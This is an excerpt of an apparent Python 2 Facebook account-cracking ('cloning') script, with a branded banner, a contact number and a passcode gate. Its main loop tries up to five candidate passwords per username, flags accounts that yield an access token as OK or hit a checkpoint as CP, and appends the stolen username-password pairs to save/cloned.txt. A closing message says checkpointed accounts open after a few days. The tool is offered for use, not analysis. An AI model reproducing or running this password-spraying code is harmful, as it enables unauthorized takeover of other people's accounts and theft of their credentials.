...
██║░░██║██║░░██║██████╦╝██║██████╦╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═════╝░
 \033[1;96m          WHATSAPP NO +8801794528654
"""
...
logo2 = """
\033[1:93m␚␚␚␚␚␚␚␌␌␌␚␚␚␚␌␚␚␚␚␚␚␚␚␚␚␚␚␚␚␚␚␚␚
\033[1;92mWELCOM TO HABIB CREATION
\033[1;91mALLAH IS THE BEST PROGRAMER
\033[1;94mYOUR MIND IS YOUR BEST WEAPON
\033[1;97mwhatsapp#+8801794528654
\033[1;93m␚␚␚␚␚␚␚␌␌␌␚␚␚␚␌␚␚␚␚␚␚␚␚␚␚␚␚␚␚␚␚␚␚
"""
Username = "HABIB"
CorrectPasscode = "TRMX420"
...
while (loop == 'true'):
    ...
    if (passcode == CorrectPasscode):
            ...
            os.system('xdg-open https://www.facebook.com/HABIB.TRMX/')
##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;91m(HABIB-OK)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;91m(HABIB-CP) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(HABIB-OK)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;93m(HABIB-CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;95m(HABIB-OK)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;95m(HABIB-CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;96m(HABIB-OK)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;96m(HABIB-CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;94m(HABIB-OK)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;94m(HABIB-CP) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
    ...
    jalan("Note : Your (CP)Accounts Open after 3 to 5 days")
    print ''
    print """
